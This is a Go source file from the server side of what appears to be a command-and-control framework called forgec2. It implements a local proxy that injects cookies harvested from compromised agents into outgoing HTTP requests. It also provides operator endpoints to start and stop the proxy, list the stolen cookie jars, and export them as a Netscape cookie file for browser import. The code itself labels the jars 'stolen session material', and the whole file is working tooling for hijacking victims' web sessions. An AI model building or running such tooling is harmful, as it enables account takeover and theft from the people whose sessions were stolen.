package server

import (
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// Isolated cookie browser: a 127.0.0.1 HTTP proxy that injects harvested
// cookies on plaintext HTTP. HTTPS CONNECT is a raw tunnel — cookies cannot
// be injected without TLS MITM, which this proxy does not do. Operators
// should import the Netscape jar into a dedicated browser profile for HTTPS.

type cookieProxyEngine struct {
	mu       sync.Mutex
	sessions map[string]*cookieProxySession
}

type cookieProxySession struct {
	agentID  string
	jars     []cookieJarEntry
	listener net.Listener
	port     int
	srv      *http.Server
	started  time.Time

	// tunnels tracks hijacked CONNECT connections. Closing the http.Server
	// does not touch a hijacked connection, so without this registry a stopped
	// proxy left every established tunnel running until the peer gave up.
	tunnelsMu sync.Mutex
	tunnels   map[net.Conn]struct{}
}

func (s *cookieProxySession) trackTunnel(conn net.Conn) {
	s.tunnelsMu.Lock()
	defer s.tunnelsMu.Unlock()
	if s.tunnels == nil {
		s.tunnels = make(map[net.Conn]struct{})
	}
	s.tunnels[conn] = struct{}{}
}

func (s *cookieProxySession) untrackTunnel(conn net.Conn) {
	s.tunnelsMu.Lock()
	defer s.tunnelsMu.Unlock()
	delete(s.tunnels, conn)
}

// closeTunnels tears down every established CONNECT tunnel.
func (s *cookieProxySession) closeTunnels() {
	s.tunnelsMu.Lock()
	tunnels := make([]net.Conn, 0, len(s.tunnels))
	for c := range s.tunnels {
		tunnels = append(tunnels, c)
	}
	s.tunnels = nil
	s.tunnelsMu.Unlock()
	for _, c := range tunnels {
		_ = c.Close()
	}
}

func newCookieProxyEngine() *cookieProxyEngine {
	return &cookieProxyEngine{sessions: make(map[string]*cookieProxySession)}
}

func (e *cookieProxyEngine) ingest(agentID string, jars []cookieJarEntry) {
	if len(jars) == 0 {
		return
	}
	e.mu.Lock()
	defer e.mu.Unlock()
	if sess, ok := e.sessions[agentID]; ok {
		sess.jars = jars
		return
	}
	e.sessions[agentID] = &cookieProxySession{agentID: agentID, jars: jars}
}

func (e *cookieProxyEngine) get(agentID string) *cookieProxySession {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.sessions[agentID]
}

func (e *cookieProxyEngine) start(agentID string, port int) (int, error) {
	e.mu.Lock()
	defer e.mu.Unlock()
	if sess, ok := e.sessions[agentID]; ok && sess.listener != nil {
		return sess.port, nil
	}
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return 0, err
	}
	actual := ln.Addr().(*net.TCPAddr).Port
	sess := e.sessions[agentID]
	if sess == nil {
		sess = &cookieProxySession{agentID: agentID, tunnels: make(map[net.Conn]struct{})}
		e.sessions[agentID] = sess
	}
	sess.listener = ln
	sess.port = actual
	sess.started = time.Now()
	handler := &cookieProxyHandler{sess: sess}
	sess.srv = &http.Server{
		Handler:           handler,
		ReadHeaderTimeout: 10 * time.Second,
	}
	go func() {
		if err := sess.srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			slog.Warn("cookie proxy stopped", "agent_id", agentID, "err", err)
		}
	}()
	return actual, nil
}

func (e *cookieProxyEngine) stop(agentID string) error {
	e.mu.Lock()
	sess, ok := e.sessions[agentID]
	if !ok {
		e.mu.Unlock()
		return fmt.Errorf("no cookie proxy for agent %s", agentID)
	}
	delete(e.sessions, agentID)
	e.mu.Unlock()
	if sess.srv != nil {
		_ = sess.srv.Close()
	}
	if sess.listener != nil {
		_ = sess.listener.Close()
	}
	// Hijacked CONNECT tunnels outlive srv.Close(), so tear them down
	// explicitly — a stopped proxy must not keep relaying.
	sess.closeTunnels()
	return nil
}

type cookieProxyHandler struct {
	sess *cookieProxySession
}

// cookieProxyTransport is the upstream transport for proxied plaintext
// requests. http.DefaultTransport has no response-header or idle timeout, so a
// hung target held a proxy connection (and its buffered body) open forever;
// these bounds keep a stalled site from pinning resources.
var cookieProxyTransport = &http.Transport{
	Proxy:                 http.ProxyFromEnvironment,
	DialContext:           (&net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
	MaxIdleConns:          32,
	IdleConnTimeout:       30 * time.Second,
	TLSHandshakeTimeout:   10 * time.Second,
	ExpectContinueTimeout: 1 * time.Second,
	ResponseHeaderTimeout: 20 * time.Second,
}

// hopByHopHeaders are per-connection headers a proxy must not forward in
// either direction (RFC 7230 §6.1). Forwarding them corrupts the next request
// on the same connection and leaks proxy credentials upstream.
var hopByHopHeaders = []string{
	"Connection",
	"Keep-Alive",
	"Proxy-Authenticate",
	"Proxy-Authorization",
	"Proxy-Connection",
	"Te",
	"Trailer",
	"Transfer-Encoding",
	"Upgrade",
}

func stripHopByHop(h http.Header) {
	for _, name := range hopByHopHeaders {
		h.Del(name)
	}
}

func (h *cookieProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodConnect {
		h.handleConnect(w, r)
		return
	}
	target := r.URL
	if !target.IsAbs() {
		host := r.Host
		if host == "" {
			http.Error(w, "missing host", http.StatusBadRequest)
			return
		}
		target = &url.URL{Scheme: "http", Host: host, Path: r.URL.Path, RawQuery: r.URL.RawQuery}
	}
	out, err := http.NewRequest(r.Method, target.String(), r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	out.Header = r.Header.Clone()
	stripHopByHop(out.Header)
	if ck := cookieHeaderForHost(h.sess.jars, target.Host); ck != "" {
		if existing := out.Header.Get("Cookie"); existing != "" {
			out.Header.Set("Cookie", existing+"; "+ck)
		} else {
			out.Header.Set("Cookie", ck)
		}
	}
	resp, err := cookieProxyTransport.RoundTrip(out)
	if err != nil {
		http.Error(w, "upstream failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	stripHopByHop(resp.Header)
	for k, vv := range resp.Header {
		for _, v := range vv {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)
	_, _ = io.Copy(w, io.LimitReader(resp.Body, 32<<20))
}

func (h *cookieProxyHandler) handleConnect(w http.ResponseWriter, r *http.Request) {
	dest := r.Host
	if dest == "" {
		http.Error(w, "missing host", http.StatusBadRequest)
		return
	}
	if !strings.Contains(dest, ":") {
		dest += ":443"
	}
	backend, err := net.DialTimeout("tcp", dest, 10*time.Second)
	if err != nil {
		http.Error(w, "connect failed", http.StatusBadGateway)
		return
	}
	hj, ok := w.(http.Hijacker)
	if !ok {
		backend.Close()
		http.Error(w, "hijack unsupported", http.StatusInternalServerError)
		return
	}
	conn, bufrw, err := hj.Hijack()
	if err != nil {
		backend.Close()
		return
	}
	_, _ = bufrw.WriteString("HTTP/1.1 200 Connection Established\r\n\r\n")
	_ = bufrw.Flush()
	// Registered so stopping the proxy tears this tunnel down instead of
	// leaving it relaying after the operator believes it is off.
	h.sess.trackTunnel(conn)
	go func() {
		var wg sync.WaitGroup
		wg.Go(func() {
			// Pump client→backend. The source is the buffered reader so any
			// bytes already consumed at Hijack() are relayed first. When the
			// client side ends, close the conn so the outer pump cannot
			// stay blocked on a target that never closes the connection.
			_, _ = io.Copy(backend, bufrw.Reader)
			conn.Close()
		})
		// Pump backend→client. When either direction ends, close the
		// client conn to unblock the other pump, then close the backend.
		_, _ = io.Copy(conn, backend)
		conn.Close()
		wg.Wait()
		backend.Close()
		h.sess.untrackTunnel(conn)
	}()
}

func (s *Server) ingestCookieExport(agentID, output string) {
	if s.cookieProxy == nil {
		return
	}
	jars := parseCookieExport(output)
	if len(jars) == 0 {
		return
	}
	s.cookieProxy.ingest(agentID, jars)
}

func (s *Server) loadLatestCookieJar(agentID string) []cookieJarEntry {
	if s.cookieProxy != nil {
		if sess := s.cookieProxy.get(agentID); sess != nil && len(sess.jars) > 0 {
			return sess.jars
		}
	}
	var task db.Task
	if err := s.db.Where("agent_id = ? AND type = ? AND status = ?", agentID, "cookie_export", "completed").
		Order("updated_at desc").First(&task).Error; err != nil {
		return nil
	}
	jars := parseCookieExport(task.Result)
	if len(jars) > 0 && s.cookieProxy != nil {
		s.cookieProxy.ingest(agentID, jars)
	}
	return jars
}

func (s *Server) handleCookieProxyStart(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	port := 0
	if v := c.PostForm("port"); v != "" {
		n, err := strconv.Atoi(v)
		if err != nil || n < 0 || n > 65535 {
			respondError(c, http.StatusBadRequest, "invalid port")
			return
		}
		port = n
	}
	jars := s.loadLatestCookieJar(id)
	if s.cookieProxy == nil {
		s.cookieProxy = newCookieProxyEngine()
	}
	if len(jars) > 0 {
		s.cookieProxy.ingest(id, jars)
	}
	actual, err := s.cookieProxy.start(id, port)
	if err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "cookie proxy"))
		return
	}
	n, dec := cookieJarStats(jars)
	s.LogAuditRecord(c, "cookie_proxy_start", "agent", id, fmt.Sprintf("127.0.0.1:%d cookies=%d", actual, n), true, nil)
	respond(c, gin.H{

		"host":              "127.0.0.1",
		"port":              actual,
		"cookies":           n,
		"decrypted":         dec,
		"https_note":        "HTTPS CONNECT is a tunnel only — import the Netscape jar into a dedicated browser profile to use HTTPS cookies. This proxy injects Cookie headers on HTTP.",
		"proxy_url":         fmt.Sprintf("http://127.0.0.1:%d", actual),
		"netscape_download": fmt.Sprintf("/agents/%s/cookie_proxy/netscape", id),
	})
}

func (s *Server) handleCookieProxyStop(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if s.cookieProxy == nil {
		respondError(c, http.StatusBadRequest, "no cookie proxy")
		return
	}
	// Same tenant gate as start: without it a caller from another tenant could
	// tear down a pivot they are not allowed to see.
	if s.resolveVisibleAgentID(c, id) == "" {
		respondError(c, http.StatusNotFound, "agent not found")
		return
	}
	if err := s.cookieProxy.stop(id); err != nil {
		respondErrorSafe(c, http.StatusBadRequest, err, "")
		return
	}
	s.LogAuditRecord(c, "cookie_proxy_stop", "agent", id, "", true, nil)
	respond(c, gin.H{})
}

func (s *Server) handleCookieProxyStatus(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if s.resolveVisibleAgentID(c, id) == "" {
		respondError(c, http.StatusNotFound, "agent not found")
		return
	}
	jars := s.loadLatestCookieJar(id)
	n, dec := cookieJarStats(jars)
	port := 0
	if s.cookieProxy != nil {
		if sess := s.cookieProxy.get(id); sess != nil {
			port = sess.port
		}
	}
	respond(c, gin.H{

		"port":      port,
		"running":   port > 0,
		"cookies":   n,
		"decrypted": dec,
		"host":      "127.0.0.1",
	})
}

func (s *Server) handleCookieProxyJar(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	// The jar is stolen session material: never serve another tenant's.
	if s.resolveVisibleAgentID(c, id) == "" {
		respondError(c, http.StatusNotFound, "agent not found")
		return
	}
	jars := s.loadLatestCookieJar(id)
	respond(c, gin.H{"cookies": jars, "count": len(jars)})
}

func (s *Server) handleCookieProxyNetscape(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if s.resolveVisibleAgentID(c, id) == "" {
		respondError(c, http.StatusNotFound, "agent not found")
		return
	}
	jars := s.loadLatestCookieJar(id)
	body := netscapeCookieFile(jars)
	c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="cookies-%s.txt"`, id))
	c.Data(http.StatusOK, "text/plain; charset=utf-8", []byte(body))
}
